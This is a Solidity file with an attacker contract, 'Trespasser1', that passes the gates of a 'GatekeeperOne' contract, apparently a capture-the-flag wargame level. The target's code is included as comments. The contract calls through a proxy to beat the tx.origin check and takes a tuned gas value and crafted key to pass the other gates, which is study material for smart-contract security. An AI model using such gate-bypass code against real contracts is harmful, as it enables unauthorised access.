// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Trespasser1 {
  address public immutable owner;
  IGatekeeperOne public immutable gatekeeper;

  constructor (address _gatekeeper) {
    owner = msg.sender;
    gatekeeper = IGatekeeperOne(_gatekeeper);
  }

  modifier onlyOwner {
    require(msg.sender == owner, "ERR_NOT_OWNER");
    _;
  }

  function wrectIt(bytes8 key, uint _gas) public onlyOwner {
    if (_gas > 0) {
      bool entered = gatekeeper.enter{gas: _gas}(key);
      require(entered == true, "ERR_NOT_ENTERED");
    } else {
      bool entered = gatekeeper.enter(key);
      require(entered == true, "ERR_NOT_ENTERED");
    }
  }
}

interface IGatekeeperOne {
  function entrant() external returns (address);
  function enter(bytes8 _gateKey) external returns (bool);
}

// contract GatekeeperOne {

//   address public entrant;

//   modifier gateOne() {
//     require(msg.sender != tx.origin);
//     _;
//   }

//   modifier gateTwo() {
//     require(gasleft() % 8191 == 0);
//     _;
//   }

//   modifier gateThree(bytes8 _gateKey) {
//       require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
//       require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
//       require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
//     _;
//   }

//   function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
//     entrant = tx.origin;
//     return true;
//   }
// }